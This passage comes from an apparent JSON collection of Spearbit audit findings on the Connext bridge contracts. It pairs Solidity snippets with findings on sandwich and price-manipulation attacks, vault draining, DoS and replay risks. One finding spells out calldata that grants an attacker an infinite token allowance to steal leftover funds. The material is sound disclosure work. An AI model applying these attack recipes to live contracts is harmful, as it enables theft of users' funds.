arbitrarily reduced. //SPDX-License-Identifier: MIT pragma solidity 0.8.14; import \"hardhat/console.sol\"; contract test { uint[] balances = new uint[](10); function swap(uint8 tokenIndexFrom,uint8 tokenIndexTo,uint dx) public { uint dy=dx; // simplified uint256[] memory mbalances = balances; balances[tokenIndexFrom] = mbalances[tokenIndexFrom] + dx; balances[tokenIndexTo] = mbalances[tokenIndexTo] - dy; } constructor() { balances[3] = 100; swap(3,3,10); console.log(balances[3]); // 90 } }",
        "labels": [
            "Spearbit",
            "Connext",
            "Severity: Critical Risk"
        ]
    },
    {
        "title": "Use of spot price in SponsorVault leads to sandwich attack.",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf",
        "body": "There is a special role sponsor in the protocol. Sponsors can cover the liquidity fee and transfer fee for users, making it more favorable for users to migrate to the new chain. Sponsors can either provide liquidity for each adopted token or provide the native token in the SponsorVault. If the native token is provided, the SponsorVault will swap to the adopted token before transferring it to users. contract SponsorVault is ISponsorVault, ReentrancyGuard, Ownable { ... function reimburseLiquidityFees( address _token, uint256 _liquidityFee, address _receiver ) external override onlyConnext returns (uint256) { ... uint256 amountIn = tokenExchange.getInGivenExpectedOut(_token, _liquidityFee); amountIn = currentBalance >= amountIn ? amountIn : currentBalance; // sponsored fee may end being less than _liquidityFee due to slippage sponsoredFee = tokenExchange.swapExactIn{value: amountIn}(_token, msg.sender); ... } } The spot AMM price is used when doing the swap. Attackers can manipulate the value of getInGivenExpectedOut and make SponsorVault sell the native token at a bad price. By executing a sandwich attack the exploiters can drain all native tokens in the sponsor vault. For the sake of the following example, assume that _token is USDC and native token is ETH, the sponsor tries to sponsor 100 usdc to the users:  Attacker first manipulates the DEX and makes the exchange of 1 ETH = 0.1 USDC.  getInGivenExpectedOut returns 100 / 0.1 = 1000.  tokenExchange.swapExactIn buys 100 USDC with 1000 ETH, causing the ETH price to decrease even lower.  Attacker buys ETH at a lower prices and realizes a profit.",
        "labels": [
            "Spearbit",
            "Connext",
            "Severity: Critical Risk"
        ]
    },
    {
        "title": "Configuration is crucial (both Nomad and Connext)",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf",
        "body": "The Connext and Nomad protocol rely heavily on configuration parameters. These parameters are configured during deployment time and are updated afterwards. Configuration errors can have major conse- quences. Examples of important configurations are:  BridgeFacet.sol: s.promiseRouter.  BridgeFacet.sol: s.connextions.  BridgeFacet.sol: s.approvedSequencers.  Router.sol: remotes[].  xAppConnectionManager.sol: home .  xAppConnectionManager.sol: replicaToDomain[].  xAppConnectionManager.sol: domainToReplica[].",
        "labels": [
            "Spearbit",
            "Connext",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Deriving price with balanceOf is dangerous",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf",
        "body": "getPriceFromDex derives the price by querying the balance of AMMs pools. function getPriceFromDex(address _tokenAddress) public view returns (uint256) { PriceInfo storage priceInfo = priceRecords[_tokenAddress]; ... uint256 rawTokenAmount = IERC20Extended(priceInfo.token).balanceOf(priceInfo.lpToken); ... uint256 rawBaseTokenAmount = IERC20Extended(priceInfo.baseToken).balanceOf(priceInfo.lpToken); ... } Deriving the price with balanceOf is dangerous as balanceOf may be gamed. Consider univ2 as an example; Exploiters can first send tokens into the pool and pump the price, then absorb the tokens that were previously donated by calling mint.",
        "labels": [
            "Spearbit",
            "Connext",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Routers can sybil attack the sponsor vault to drain funds",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf",
        "body": "When funds are bridged from source to destination chain messages must first go through optimistic verification before being executed on the destination BridgeFacet.sol contract. Upon transfer processing the contract checks if the domain is sponsored. If such is the case then the user is reimbursed for both liquidity fees paid when the transfer was initiated and for the fees paid to the relayer during message propagation. There currently isnt any mechanism to detect sybil attacks. Therefore, a router can perform several large value transfers in an effort to drain the sponsor vault of its funds. Because liquidity fees are paid to the router by a user connected to the router, there isnt any value lost in this type of attack.",
        "labels": [
            "Spearbit",
            "Connext",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Routers are exposed to extreme slippage if they attempt to repay debt before being reconciled",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf",
        "body": "When routers are reconciled, the local asset may need to be exchanged for the adopted asset in order to repay the unbacked Aave loan. AssetLogic.swapFromLocalAssetIfNeededForExactOut() takes two key arguments:  _amount representing exactly how much of the adopted asset should be received.  _maxIn which is used to limit slippage and limit how much of the local asset is used in the swap. Upon failure to swap, the protocol will reset the values for unbacked Aave debt and distribute local tokens to the router. However, if this router partially paid off some of the unbacked Aave debt before being reconciled, _maxIn will diverge from _amount, allowing value to be extracted in the form of slippage. As a result, routers may receive less than the amount of liquidity they initially provided, leading to router insolvency.",
        "labels": [
            "Spearbit",
            "Connext",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Malicious call data can DOS execute",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf",
        "body": "An attacker can DOS the executor contract by giving infinite allowance to normal users. Since the executor increases allowance before triggering an external call, the tx will always revert if the allowance is already infinite. 11 function execute(ExecutorArgs memory _args) external payable override onlyConnext returns (bool, bytes ,! memory) { ... if (!isNative && hasValue) { SafeERC20.safeIncreaseAllowance(IERC20(_args.assetId), _args.to, _args.amount); // reverts if set to `infinite` before } ... (success, returnData) = ExcessivelySafeCall.excessivelySafeCall(...) // can set to `infinite` allowance ... ,! ,! }",
        "labels": [
            "Spearbit",
            "Connext",
            "Severity: High Risk"
        ]
    },
    {
        "title": "DOS attack on the Nomad Home.sol Contract",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf",
        "body": "Upon calling xcall(), a message is dispatched via Nomad. A hash of this message is inserted into the merkle tree and the new root will be added at the end of the queue. Whenever the updater of Home.sol commits to a new root, improperUpdate() will check that the new update is not fraudulent. In doing so, it must iterate through the queue of merkle roots to find the correct committed root. Because anyone can dispatch a message and insert a new root into the queue it is possible to impact the availability of the protocol by preventing honest messages from being included in the updated root. function improperUpdate(..., bytes32 _newRoot, ... ) public notFailed returns (bool) { ... // if the _newRoot is not currently contained in the queue, // slash the Updater and set the contract to FAILED state if (!queue.contains(_newRoot)) { _fail(); ... } ... } function contains(Queue storage _q, bytes32 _item) internal view returns (bool) { for (uint256 i = _q.first; i <= _q.last; i++) { if (_q.queue[i] == _item) { return true; } } return false; }",
        "labels": [
            "Spearbit",
            "Connext",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Upon failing to back unbacked debt _reconcileProcessPortal() will leave the converted asset in the contract",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf",
        "body": "When routers front liquidity for the protocols users they are later reconciled once the bridge has optimistically verified transfers from the source chain. Upon being reconciled, the _reconcileProcessPortal() attempts to first pay back Aave debt before distributing the rest back to the router. However, _reconcileProcess- Portal() will not convert the adopted asset back to the local asset in the case where the call to the Aave pool fails. Instead, the function will set amountIn = 0 and continue to distribute the local asset to the router. if (success) { emit AavePortalRepayment(_transferId, adopted, backUnbackedAmount, portalFee); } else { // Reset values s.portalDebt[_transferId] += backUnbackedAmount; s.portalFeeDebt[_transferId] += portalFee; // Decrease the allowance SafeERC20.safeDecreaseAllowance(IERC20(adopted), s.aavePool, totalRepayAmount); // Update the amount repaid to 0, so the amount is credited to the router amountIn = 0; emit AavePortalRepaymentDebt(_transferId, adopted, s.portalDebt[_transferId], s.portalFeeDebt[_transferId]); ,! }",
        "labels": [
            "Spearbit",
            "Connext",
            "Severity: High Risk"
        ]
    },
    {
        "title": "_handleExecuteTransaction() doesnt handle native assets correctly",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf",
        "body": "The function _handleExecuteTransaction() sends any native tokens to the executor contract first, and then calls s.executor.execute(). This means that within that function msg.value will always be 0. So the associated logic that uses msg.value doesnt work as expected and the function doesnt handle native assets correctly. Note: also see issue \"Executor reverts on receiving native tokens from BridgeFacet\" contract BridgeFacet is BaseConnextFacet { function _handleExecuteTransaction(...)... { ... AssetLogic.transferAssetFromContract(_asset, address(s.executor), _amount); (bool success, bytes memory returnData) = s.executor.execute(...); // no native tokens send } } contract Executor is IExecutor { function execute(ExecutorArgs memory _args) external payable override onlyConnext returns (bool, bytes memory) { ,! ... if (isNative && msg.value != _args.amount) { // msg.value is always 0 ... } } }",
        "labels": [
            "Spearbit",
            "Connext",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Add checks to xcall()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf",
        "body": "The function xcall() does some sanity checks, nevertheless more checks should be added to prevent issues later on in the use of the protocol. If _args.recovery== 0 then _sendToRecovery() will send funds to the 0 address, effectively losing them. If _params.agent == 0 the forceReceiveLocal cant be used and funds might be locked forever. The _args.params.destinationDomain should never be s.domain, although this is also implicitly checked via _mustHaveRemote() assuming a correct configuration. If _args.params.slippageTol is set to something greater than s.LIQUIDITY_FEE_DENOMINATOR then funds can be locked as xcall() allows for the user to provide the local asset, avoiding any swap while _handleExecuteLiquid- ity() in execute() may attempt to perform a swap on the destination chain. function xcall(XCallArgs calldata _args) external payable nonReentrant whenNotPaused returns (bytes32) { // Sanity checks. ... } 14",
        "labels": [
            "Spearbit",
            "Connext",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Executor and AssetLogic deals with the native tokens inconsistently that breaks execute()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf",
        "body": "When dealing with an external callee the BridgeFacet will transfer liquidity to the Executor before calling Executor.execute. In order to send the native token:  The Executor checks for _args.assetId == address(0).  AssetLogic.transferAssetFromContract() disallows address(0). Note: also see issue Executor reverts on receiving native tokens from BridgeFacet. 15 contract BridgeFacet is BaseConnextFacet { function _handleExecuteTransaction() ...{ ... AssetLogic.transferAssetFromContract(_asset, address(s.executor), _amount); // _asset may not ,! be 0 (bool success, bytes memory returnData) = s.executor.execute( IExecutor.ExecutorArgs( // assetId parameter from ExecutorArgs // must be 0 for Native asset ... _asset, ... ) ); ... } } library AssetLogic { function transferAssetFromContract( address _assetId, ... ) { ... // No native assets should ever be stored on this contract if (_assetId == address(0)) revert AssetLogic__transferAssetFromContract_notNative(); if (_assetId == address(s.wrapper)) { // If dealing with wrapped assets, make sure they are properly unwrapped // before sending from contract s.wrapper.withdraw(_amount); Address.sendValue(payable(_to), _amount); } } } contract Executor is IExecutor { function execute(ExecutorArgs memory _args) external payable override onlyConnext returns (bool, bytes memory) { ,! ... bool isNative = _args.assetId == address(0); ... } } The BridgeFacet cannot handle external callees when using native tokens.",
        "labels": [
            "Spearbit",
            "Connext",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Executor reverts on receiving native tokens from BridgeFacet",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf",
        "body": "When doing an external call in execute(), the BridgeFacet provides liquidity into the Executor contract before calling Executor.execute. The BridgeFacet transfers native token when address(wrapper) is provided. The Executor however does not have a fallback/ receive function. Hence, the transaction will revert when the BridgeFacet tries to send the native token to the Executor contract. function _handleExecuteTransaction( ... AssetLogic.transferAssetFromContract(_asset, address(s.executor), _amount); (bool success, bytes memory returnData) = s.executor.execute(...); ... } function transferAssetFromContract(...) ... { ... if (_assetId == address(s.wrapper)) { // If dealing with wrapped assets, make sure they are properly unwrapped // before sending from contract s.wrapper.withdraw(_amount); Address.sendValue(payable(_to), _amount); } else { ... } }",
        "labels": [
            "Spearbit",
            "Connext",
            "Severity: High Risk"
        ]
    },
    {
        "title": "SponsorVault sponsors full transfer amount in reimburseLiquidityFees()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf",
        "body": "The BridgeFacet passes args.amount as _liquidityFee when calling reimburseLiquidityFees. Instead of sponsoring liquidityFee, the sponsor vault would sponsor full transfer amount to the reciever. Note: Luckily the amount in reimburseLiquidityFees is capped by relayerFeeCap. function _handleExecuteTransaction(...) ... { ... (bool success, bytes memory data) = address(s.sponsorVault).call( abi.encodeWithSelector(s.sponsorVault.reimburseLiquidityFees.selector, _asset, _args.amount, _args.params.to) ); ,! } 17",
        "labels": [
            "Spearbit",
            "Connext",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Tokens can get stuck in Executor contract if the destination doesnt claim them all",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf",
        "body": "The function execute() increases allowance and then calls the recipient (_args.to). When the recipient does not use all tokens, these could remain stuck inside the Executor contract. Note: the executor can have excess tokens, see: kovan executor. Note: see issue \"Malicious call data can DOS execute or steal unclaimed tokens in the Executor contract\". function execute(...) ... { ... if (!isNative && hasValue) { SafeERC20.safeIncreaseAllowance(IERC20(_args.assetId), _args.to, _args.amount); } ... (success, returnData) = ExcessivelySafeCall.excessivelySafeCall( _args.to, ... ); ... }",
        "labels": [
            "Spearbit",
            "Connext",
            "Severity: High Risk"
        ]
    },
    {
        "title": "reimburseLiquidityFees send tokens twice",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf",
        "body": "The function reimburseLiquidityFees() is called from the BridgeFacet, making the msg.sender within this function to be BridgeFacet. When using tokenExchanges via swapExactIn() tokens are sent to msg.sender, which is the BridgeFacet. Then, tokens are sent again to msg.sender via safeTransfer(), which is also the BridgeFacet. Therefore, tokens end up being sent to the BridgeFacet twice. Note: the check ...balanceOf(...) != starting + sponsored should fail too. Note: The fix in C4 seems to introduce this issue: code4rena-246 18 contract BridgeFacet is BaseConnextFacet { function _handleExecuteTransaction(... ) ... { ... uint256 starting = IERC20(_asset).balanceOf(address(this)); ... (bool success, bytes memory data) = address(s.sponsorVault).call( abi.encodeWithSelector(s.sponsorVault.reimburseLiquidityFees.selector, _asset, _args.amount, ,! _args.params.to) ); if (success) { uint256 sponsored = abi.decode(data, (uint256)); // Validate correct amounts are transferred if (IERC20(_asset).balanceOf(address(this)) != starting + sponsored) { // this should revert BridgeFacet__handleExecuteTransaction_invalidSponsoredAmount(); ,! fail now } ... } ... } } contract SponsorVault is ISponsorVault, ReentrancyGuard, Ownable { function reimburseLiquidityFees(... ) { if (address(tokenExchanges[_token]) != address(0)) { ... sponsoredFee = tokenExchange.swapExactIn{value: amountIn}(_token, msg.sender); // send to ,! msg.sender } else { ... } ... IERC20(_token).safeTransfer(msg.sender, sponsoredFee); // send again to msg.sender } } interface ITokenExchange { /** * @notice Swaps the exact amount of native token being sent for a given token. * @param token The token to receive * @param recipient The recipient of the token * @return The amount of tokens resulting from the swap */ function swapExactIn(address token, address recipient) external payable returns (uint256); }",
        "labels": [
            "Spearbit",
            "Connext",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Anyone can repay the portalDebt with different tokens",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf",
        "body": "Routers can provide liquidity in the protocol to improve the UX of cross-chain transfers. Liquidity is sent to users under the routers consent before the cross-chain message is settled on the optimistic message protocol, i.e., Nomad. The router can also borrow liquidity from AAVE if the router does not have enough of it. It is the routers responsibility to repay the debt to AAVE. contract PortalFacet is BaseConnextFacet { function repayAavePortalFor( address _adopted, uint256 _backingAmount, uint256 _feeAmount, bytes32 _transferId ) external payable { address adopted = _adopted == address(0) ? address(s.wrapper) : _adopted; ... // Transfer funds to the contract uint256 total = _backingAmount + _feeAmount; if (total == 0) revert PortalFacet__repayAavePortalFor_zeroAmount(); (, uint256 amount) = AssetLogic.handleIncomingAsset(_adopted, total, 0); ... // repay the loan _backLoan(adopted, _backingAmount, _feeAmount, _transferId); } } The PortalFacet does not check whether _adopted is the correct token in debt. Assume that the protocol borrows ETH for the current _transferId, therefore Router should repay ETH to clear the debt. However, the Router can provide any valid tokens, e.g. DAI, USDC, to clear the debt. This results in the insolvency of the protocol. Note: a similar issue is also present in repayAavePortal().",
        "labels": [
            "Spearbit",
            "Connext",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Malicious call data can steal unclaimed tokens in the Executor contract",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf",
        "body": "Users can provide a destination contract args.to and arbitrary data _args.callData when doing a cross-chain transfer. The protocol will provide the allowance to the callee contract and triggers the function call through ExcessivelySafeCall.excessivelySafeCall. 20 contract Executor is IExecutor { function execute(ExecutorArgs memory _args) external payable override onlyConnext returns (bool, bytes memory) { ,! ... SafeERC20.safeIncreaseAllowance(IERC20(_args.assetId), _args.to, _args.amount); ... // Try to execute the callData // the low level call will return `false` if its execution reverts (success, returnData) = ExcessivelySafeCall.excessivelySafeCall( _args.to, gas, isNative ? _args.amount : 0, MAX_COPY, _args.callData ); ... } } Since there arent restrictions on the destination contract and calldata, exploiters can steal the tokens from the executor. Note: the executor does have excess tokens, see: see: kovan executor. Note: see issue Tokens can get stuck in Executor contract. Tokens can be stolen by granting an allowance. Setting calldata = abi.encodeWithSelector(ERC20.approve.selector, exploiter, type(uint256).max); and args.to = tokenAddress allows the exploiter to get an infinite allowance of any token, effectively stealing any unclaimed tokens left in the executor.",
        "labels": [
            "Spearbit",
            "Connext",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Fee-On-Transfer tokens are not explicitly denied in swap()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf",
        "body": "The swap() function is used extensively within the Connext protocol, primarily when swapping be- tween local and adopted assets. When a swap is performed, the function will check the actual amount transferred. However, this is not consistent with other swap functions which check that the amount transferred is equal to dx. As a result, overwriting dx with tokenFrom.balanceOf(address(this)).sub(beforeBalance) allows for fee-on- transfer tokens to work as intended.",
        "labels": [
            "Spearbit",
            "Connext",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "xcall() may erroneously overwrite prior calls to bumpTransfer()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf",
        "body": "The bumpTransfer() function allows users to increment the relayer fee on any given transferId without checking if the unique transfer identifier exists. As a result, a subsequent call to xcall() will overwrite the s.relayerFees mapping, leading to lost funds.",
        "labels": [
            "Spearbit",
            "Connext",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "_handleExecuteLiquidity doesnt consistently check for receiveLocalOverrides",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf",
        "body": "The function _handleExecuteLiquidity() initially checks for receiveLocal but does not check for receiveLocalOverrides. Later on it does check for both of values. function _handleExecuteLiquidity(... ) ... { ... if ( !_args.params.receiveLocal && // doesn't check for receiveLocalOverrides s.routerBalances[_args.routers[0]][_args.local] < toSwap && s.aavePool != address(0) ) { ... if (_args.params.receiveLocal || s.receiveLocalOverrides[_transferId]) { // extra check return (toSwap, _args.local); } } 22 As a result, the portal may pay the bridge user in the adopted asset when they opted to override this behaviour to avoid slippage conditions outside of their boundaries, potentially leading to an unwarranted reception of funds denominated in the adopted asset.",
        "labels": [
            "Spearbit",
            "Connext",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Router signatures can be replayed when executing messages on the destination domain",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf",
        "body": "Connext bridge supports near-instant transfers by allowing users to pay a small fee to routers for providing them with liquidity. Gelato relayers are tasked with taking in bids from liquidity providers who sign a message consisting of the transferId and path length. The path length variable only guarantees that the message they signed will only be valid if _args.routers.length - 1 routers are also selected. However, it does not prevent Gelato relayers from re-using the same signature multiple times. As a result, routers may unintentionally provide more liquidity than expected.",
        "labels": [
            "Spearbit",
            "Connext",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "diamondCut() allows re-execution of old updates",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf",
        "body": "The function diamondCut() of LibDiamond verifies the signed version of the update parameters. It checks the signed version is available and a sufficient amount of time has passed. However it doesnt prevent multiple executions and the signed version stays valid forever. This allows old updates to be executed again. Assume the following:  facet_x (or function_y) has value: version_1.  then: replace facet_x (or function_y) with version_2.  then a bug is found in version_2 and it is rolled back with: replace facet_x (or function_y) with ver- sion_1. 23  then a (malicious) owner could immediately do: replace facet_x (or function_y) with version_2 (be- cause it is still valid). Note: the risk is limited because it can only executed by the contract owner, however this is probably not how the mechanism should work. library LibDiamond { function diamondCut(...) ... { ... uint256 time = ds.acceptanceTimes[keccak256(abi.encode(_diamondCut, _init, _calldata))]; require(time != 0 && time < block.timestamp, \"LibDiamond: delay not elapsed\"); ... } }",
        "labels": [
            "Spearbit",
            "Connext",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Not always safeApprove(..., 0)",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf",
        "body": "Some functions like _reconcileProcessPortal of BaseConnextFacet and _swapAssetOut of As- setLogic do safeApprove(..., 0) first. contract NomadFacet is BaseConnextFacet { function _reconcileProcessPortal( ... ) ... { ... // Edge case with some tokens: Example USDT in ETH Mainnet, after the backUnbacked call there ,! could be a remaining allowance if not the whole amount is pulled by aave. // Later, if we try to increase the allowance it will fail. USDT demands if allowance is not 0, ,! it has to be set to 0 first. // Example: ,! ,! [ParaSwapRepayAdapter.sol#L138-L140](https://github.com/aave/aave-v3-periphery/blob/ca184e5278bcbc1 0d28c3dbbc604041d7cfac50b/contracts/adapters/paraswap/ParaSwapRepayAdapter.sol#L138-L140) c SafeERC20.safeApprove(IERC20(adopted), s.aavePool, 0); SafeERC20.safeIncreaseAllowance(IERC20(adopted), s.aavePool, totalRepayAmount); ... } } While the following functions dont do this:  xcall of BridgeFacet.  _backLoan of PortalFacet.  _swapAsset of AssetLogic.  execute of Executor. This could result in problems with tokens like USDT. 24 contract BridgeFacet is BaseConnextFacet { ,! function xcall(XCallArgs calldata _args) external payable nonReentrant whenNotPaused returns (bytes32) { ... SafeERC20.safeIncreaseAllowance(IERC20(bridged), address(s.bridgeRouter), bridgedAmt); ... } } contract PortalFacet is BaseConnextFacet { function _backLoan(...) ... { ... SafeERC20Upgradeable.safeIncreaseAllowance(IERC20Upgradeable(_asset), s.aavePool, _backing + ,! _fee); ... } } library AssetLogic { function _swapAsset(...) ... { ... SafeERC20.safeIncreaseAllowance(IERC20(_assetIn), address(pool), _amount); ... } } contract Executor is IExecutor { function execute( ... ) ... { ... SafeERC20.safeIncreaseAllowance(IERC20(_args.assetId), _args.to, _args.amount); ... } }",
        "labels": [
            "Spearbit",
            "Connext",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "_slippageTol does not adjust for decimal differences",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf",
        "body": "Users set the slippage tolerance in percentage. The assetLogic calculates: minReceived = (_amount * _slippageTol) / s.LIQUIDITY_FEE_DENOMINATOR Then assetLogic uses minReceived in the swap functions. The minReceived, however, does not adjust for the decimal differences between assetIn and assetOut. Users will either always hit the slippage or suffer huge slippage when assetIn and assetOut have a different number of decimals. Assume the number of decimals of assetIn is 6 and the decimal of assetOut is 18. The minReceived will be set to 10-12 smaller than the correct value. Users would be vulnerable to sandwich attacks in this case. Assume the number of decimals of assetIn is 18 and the number of decimals of assetOut is 6. The minReceived will be set to 1012 larger than the correct value. Users would always hit the slippage and the cross-chain transfer will get stuck. 25 library AssetLogic { function _swapAsset(... ) ... { // Swap the asset to the proper local asset uint256 minReceived = (_amount * _slippageTol) / s.LIQUIDITY_FEE_DENOMINATOR; ... return (pool.swapExact(_amount, _assetIn, _assetOut, minReceived), _assetOut); ... } }",
        "labels": [
            "Spearbit",
            "Connext",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Canonical assets should be keyed on the hash of domain and id",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf",
        "body": "A canonical asset is a tuple of a (domain, id) pair. TokenRegistrys owner has the power to regis- ter new tokens in the system (See TokenRegistry.ensureLocalToken() and TokenRegistry.enrollCustom()). A canonical asset is registered using the hash of its domain and id (See TokenRegistry._setCanonicalToRepre- sentation()). Connext uses only the id of a canonical asset to uniquely identify. Here are a few references:  swapStorages  canonicalToAdopted It is an issue if TokenRegistry registers two canonical assets with the same id. canonical asset an unintended one might be transferred to the destination chain, of the transfers may revert. If this id fetches the incorrect",
        "labels": [
            "Spearbit",
            "Connext",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Missing checks for Chainlink oracle",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf",
        "body": "ConnextPriceOracle.getTokenPrice() function goes through a series of oracles. At each step, it has a few validations to avoid incorrect price. If such validations succeed, the function returns the non-zero oracle price. For the Chainlink oracle, getTokenPrice() ultimately calls getPriceFromChainlink() which has the following validation  if (answer == 0 || answeredInRound < roundId || updateAt == 0) { // answeredInRound > roundId ===> ChainLink Error: Stale price // updatedAt = 0 ===> ChainLink Error: Round not complete return 0; } updateAt refers to the timestamp of the round. This value isnt checked to make sure it is recent. 26 Additionally, it is important to be aware of the minAnswer and maxAnswer of the Chainlink oracle, these values are not allowed to be reached or surpassed. See Chainlink API reference for documentation on minAnswer and maxAnswer as well as this piece of code: OffchainAggregator.sol",
        "labels": [
            "Spearbit",
            "Connext",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Same params.SlippageTol is used in two different swaps",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf",
        "body": "The Connext protocol does a cross-chain transfer with the help of the Nomad protocol. to use the Nomad protocol, Connext has to convert the adopted token into the local token. For a cross-chain transfer, users take up two swaps. Adopted -> Local at the source chain and Local -> Adopted at the destination chain. BridgeFacet.sol#L299-L304 function xcall(XCallArgs calldata _args) external payable whenNotPaused nonReentrant returns (bytes32) { ... // Swap to the local asset from adopted if applicable. (uint256 bridgedAmt, address bridged) = AssetLogic.swapToLocalAssetIfNeeded( canonical, transactingAssetId, amount, _args.params.slippageTol ); ... } BridgeFacet.sol#L637 function _handleExecuteLiquidity( bytes32 _transferId, bytes32 _canonicalId, bool _isFast, ExecuteArgs calldata _args ) private returns (uint256, address) { ... // swap out of mad* asset into adopted asset if needed return AssetLogic.swapFromLocalAssetIfNeeded(_canonicalId, _args.local, toSwap, _args.params.slippageTol); ,! } The same slippage tolerance _args.params.slippageTol is used in two swaps. In most cases users cannot set the correct slippage tolerance to protect two swaps. Assume the Nomad asset is slightly cheaper in both chains. 1 Nomad asset equals 1.01 adopted asset. An expected swap would be:1 adopted -> 1.01 Nomad asset -> 1 adopted. The right slippage tolerance should be set at 1.01 and 0.98 respectively. Users cannot set the correct tolerance with a single parameter. This makes users vulnerable to MEV searchers. Also, user transfers get stuck during periods of instability.",
        "labels": [
            "Spearbit",
            "Connext",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "getTokenPrice() returns stale token prices",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf",
        "body": "getTokenPrice() reads from the assetPrices[tokenAddress].price mapping which stores the latest price as configured by the protocol admin in setDirectPrice(). However, the check for a stale token price will never fallback to other price oracles as tokenPrice != 0. Therefore, the stale token price will be unintentionally returned.",
        "labels": [
            "Spearbit",
            "Connext",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Potential division by zero if gas token oracle is faulty",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf",
        "body": "In the event that the gas token oracle is faulty and returns malformed values, the call to reim- burseRelayerFees() in _handleExecuteTransaction() will fail. Fortunately, the low-level call() function will not prevent the transfer from being executed, however, this may lead to further issues down the line if changes are made to the sponsor vault.",
        "labels": [
            "Spearbit",
            "Connext",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Burn does not lower allowance",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf",
        "body": "The function _takeTokens() of BridgeRouter takes in the tokens from the sender. Sometimes it transfers them and sometimes it burns them. In the case of burning the tokens, the allowance isnt \"used up\". 28 function _takeTokens(... ) ... { ... if (tokenRegistry.isLocalOrigin(_token)) { ... IERC20(_token).safeTransferFrom(msg.sender, address(this), _amount); ... } else { ... _t.burn(msg.sender, _amount); ... } ... // doesn't use up the allowance } contract BridgeToken is Version0, IBridgeToken, OwnableUpgradeable, ERC20 { ... function burn(address _from, uint256 _amnt) external override onlyOwner { _burn(_from, _amnt); } }",
        "labels": [
            "Spearbit",
            "Connext",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Two step ownership transfer",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf",
